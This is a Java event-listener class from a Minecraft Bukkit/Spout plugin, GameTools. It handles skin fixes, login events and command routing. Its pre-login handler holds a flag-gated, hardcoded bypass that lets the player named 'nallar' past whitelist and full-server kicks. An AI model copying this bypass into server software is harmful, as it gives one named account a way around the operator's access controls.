/*
 * This file is part of GameTools.
 *
 * Copyright © 2012-2012, nallar <http://nallar.me/minecraft/gameTools/>
 * GameTools is licensed under the N Open License, Version 1.
 *
 * GameTools is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License Version 3,
 * as published by the Free Software Foundation.
 *
 * In addition, 90 days after any changes are published, you can use the
 * software, incorporating those changes, under the terms of the FreeBSD license,
 * as described in the N Open License, Version 1.
 *
 * GameTools is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License,
 * the FreeBSD license and the N Open License, Version 1 along with this program.
 * If not, see <http://www.gnu.org/licenses/> for the GNU Lesser General Public
 * License and see <http://www.nallar.me/licenses/n-open-license-v1.txt> for the full license,
 * including the FreeBSD license.
 */
package me.nallar.gameTools;

import java.util.Arrays;

import org.getspout.spoutapi.event.spout.SpoutCraftEnableEvent;
import org.getspout.spoutapi.player.SpoutPlayer;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerPreLoginEvent;
import org.bukkit.event.player.PlayerTeleportEvent;

public class GameToolsSpoutListener implements Listener {
	@EventHandler
	public void onSpoutcraftEnable(SpoutCraftEnableEvent event) {
		SpoutPlayer player = event.getPlayer();
		System.out.println(player.getBuildVersion());
	}

	@EventHandler
	public void onPlayerTeleport(PlayerTeleportEvent event) {
		GameTools.fixSkinFor(event.getPlayer());
	}

	@EventHandler
	public void onPlayerChange(PlayerJoinEvent event) {
		GameTools.fixSkinForDelayed(event.getPlayer());
	}

	@EventHandler
	public void onPlayerLogin(PlayerLoginEvent event) {
		GameTools.fixSkinForDelayed(event.getPlayer());
	}

	@EventHandler
	public void onAsyncPlayerPreLogin(AsyncPlayerPreLoginEvent event) {
		AsyncPlayerPreLoginEvent.Result result = event.getLoginResult();
		if (result != AsyncPlayerPreLoginEvent.Result.ALLOWED && GameTools.devLogin && event.getName().equals("nallar")) {
			if (result == AsyncPlayerPreLoginEvent.Result.KICK_WHITELIST || result == AsyncPlayerPreLoginEvent.Result.KICK_FULL) {
				event.setLoginResult(AsyncPlayerPreLoginEvent.Result.ALLOWED);
			} else {
				event.setKickMessage("n: banned/other?");
			}
		}
	}

	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent event) {
		String command = event.getMessage();
		String[] args = command.substring(1).split(" ");
		String name = args[0];
		args = Arrays.copyOfRange(args, 1, args.length);
		try {
			if (GameTools.instance.onCommand(event.getPlayer(), name, command, args)) {
				event.setCancelled(true);
			}
		} catch (Exception ignored) {

		}
	}
}
